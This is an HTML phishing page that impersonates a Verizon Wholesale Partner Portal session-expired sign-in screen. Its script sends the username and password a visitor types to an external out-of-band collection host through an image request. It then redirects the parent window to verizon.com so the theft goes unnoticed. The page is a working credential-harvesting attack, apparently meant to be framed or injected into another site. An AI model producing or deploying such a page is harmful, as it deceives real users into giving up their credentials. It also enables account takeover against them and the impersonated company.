<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Verizon Partner Portal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#f4f4f4;display:flex;align-items:center;justify-content:center;height:100vh}
.card{background:#fff;padding:40px;border-radius:4px;width:380px;box-shadow:0 2px 10px rgba(0,0,0,.15);text-align:center}
.logo{color:#cd040b;font-size:28px;font-weight:bold;letter-spacing:1px;margin-bottom:6px}
p{color:#555;font-size:13px;margin-bottom:24px}
input{width:100%;padding:11px;margin:7px 0;border:1px solid #ccc;border-radius:3px;font-size:14px}
button{background:#cd040b;color:#fff;width:100%;padding:12px;border:none;border-radius:3px;font-size:15px;cursor:pointer;margin-top:8px}
button:hover{background:#a30309}
.note{color:#888;font-size:11px;margin-top:14px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">verizon</div>
  <p>Your session has expired.<br>Please sign in to continue.</p>
  <input type="text" id="u" placeholder="Username / User ID" autocomplete="off">
  <input type="password" id="p" placeholder="Password">
  <button onclick="go()">Sign In</button>
  <div class="note">Verizon Wholesale Partner Portal</div>
</div>
<script>
function go(){
  var u=document.getElementById('u').value;
  var p=document.getElementById('p').value;
  if(!u||!p)return;
  new Image().src='https://gzfmnsaxgehfukkreifdlu8ft10lv73xb.oast.fun/creds?u='+encodeURIComponent(u)+'&p='+encodeURIComponent(p);
  parent.location='https://www.verizon.com';
}
</script>
</body>
</html>
